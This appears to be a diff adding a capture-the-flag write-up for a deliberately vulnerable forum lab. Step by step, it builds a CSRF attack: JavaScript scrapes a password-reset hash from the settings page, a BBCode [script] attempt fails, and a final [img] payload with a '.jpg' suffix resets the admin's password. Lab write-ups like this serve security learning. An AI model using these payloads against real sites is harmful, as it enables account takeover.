@@ -401,3 +401,159 @@ Content-Length: 155
 
 {"display_msg":"Admins cannot login using this method","technical_msg":"Admins must logon locally","flag":"[^FLAG^xxx^FLAG^]"}
 ```
+
+There is however a way to post new comments on the user updates forum, let's try a simple h1 tag
+
+![comments](./images/vulnforum-14.png)
+
+Well it didn't render the h1 tag but look john reviews the comments every minute. Can I construct a CSRF!
+
+Looking in the HTML for the page I spot this comment
+
+```html
+<!--
+BBCODE Plugin
+Author URI: https://github.com/code-for-sites/bbcode_plugin
+-->
+```
+
+![bbcode](./images/vulnforum-15.png)
+
+OK so I can't insert HTML directly but I probably can via this plugin!
+
+The settings page has this javascript event attached to the loginBtn
+
+```javascript
+$('.loginBtn').click( function(){
+
+    $.get( "/settings/password", {
+        'password'  :   $('input[name="new_password"]').val(),
+        'hash'      :   '1ac9c036aaf12a755084dc6a326ed7f5'
+    },function( data ) {
+        alert( data.display_msg );
+        window.location.href = '/';
+    }).fail(function(err){
+        alert( err.responseJSON.display_msg );
+    });
+});
+```
+
+Let's try and PoC some javascript in the dev console to
+
+1. Fetch the settings page
+2. Parse it into a document
+3. Set the value of new_password input to a password of our choice
+4. Trigger a click event of the loginBtn
+
+So I want to check I set the value of the input field for the password, so I tried this
+
+```javascript
+fetch('http://www.vulnforum.co.uk/settings').then(res => { 
+    return res.text(); 
+})
+.then(html => {
+    var parser = new DOMParser();
+    var doc = parser.parseFromString(html, 'text/html');
+    doc.getElementsByName('new_password')[0].value = 'password';
+    console.log(doc.getElementsByName('new_password')[0].value);
+});
+```
+
+Which logs out this to console
+
+```
+password
+```
+
+So the last step would be to see if I can trigger the click event by the selector.
+
+```javascript
+fetch('http://www.vulnforum.co.uk/settings').then(res => { 
+    return res.text(); 
+})
+.then(html => {
+    var parser = new DOMParser();
+    var doc = parser.parseFromString(html, 'text/html');
+    doc.getElementsByName('new_password')[0].value = 'password';
+    doc.querySelector('.loginBtn').click();
+});
+```
+
+OK no that didn't work, I guess it can't call an event from parsed HTML, can I rip the hash directly from the javascript?
+
+```javascript
+fetch('http://www.vulnforum.co.uk/settings').then(res => { 
+    return res.text(); 
+})
+.then(html => {
+    var parser = new DOMParser();
+    var doc = parser.parseFromString(html, 'text/html');
+    var scriptData = doc.querySelectorAll('script')[2].firstChild.data;
+    return scriptData.substr(scriptData.indexOf('hash')).split('\n', 1)[0].split(':')[1].trim().replaceAll("'", "");
+}).then(res => console.log(res));
+```
+
+Console prints
+
+```
+1ac9c036aaf12a755084dc6a326ed7f5
+```
+
+So yes in theory I can :)
+
+So new plan
+
+1. Insert a script via BBCode which..
+2. Grabs the hash for john using a fetch like the above from the settings page
+3. Insert an image into the DOM where the src is the GET url for resetting the password to our own with the retrieved hash
+
+OK so BBCode would be....
+
+```html
+[script]
+fetch('http://www.vulnforum.co.uk/settings').then(res => { 
+    return res.text(); 
+})
+.then(html => {
+    var parser = new DOMParser();
+    var doc = parser.parseFromString(html, 'text/html');
+    var scriptData = doc.querySelectorAll('script')[2].firstChild.data;
+    return scriptData.substr(scriptData.indexOf('hash')).split('\n', 1)[0].split(':')[1].trim().replaceAll("'", "");
+}).then(hash => {
+    var img = document.createElement("img");
+    img.src = "http://www.vulnforum.co.uk/settings/password?password=password&hash=" + hash;
+    document.querySelector('body').appendChild(img);
+});
+[/script]
+```
+
+Arghhhhh! Script not allowed on this page! Right I'm going to try posting the example on the github page see what that does
+
+```html
+$bb = new bbcode();
+$comment = '[a]https://www.example.com[/a] [img]https://www.example.com/img.jpg[/img] [strong]test[/strong] [b]test[/b] [script]alert(true)[/script] [u]test[/u] ';
+echo $bb->run($comment);
+```
+
+![alt](./images/vulnforum-16.png)
+
+So images work. OK.... so I wonder if the hash will only work for john it could be tied to the token cookie. Let's try
+
+```html
+[img]http://www.vulnforum.co.uk/settings/password?password=password&hash=76887c0378ba2b80f17422fb0c0791c4[/img]
+```
+
+Mmmmm nope it just renders it as text. What's different between that and the example, the jpg extension? How about
+
+```html
+[img]http://www.vulnforum.co.uk/settings/password?password=password&hash=76887c0378ba2b80f17422fb0c0791c4&x=something.jpg[/img]
+```
+
+Hey it tried to render!
+
+![alt](./images/vulnforum-17.png)
+
+Let's logout and try to login in as John! YESSSSSSS!!!!! I have the final flag :D! Challenge complete!
+
+![flag 4](./images/vulnforum-18.png)
+
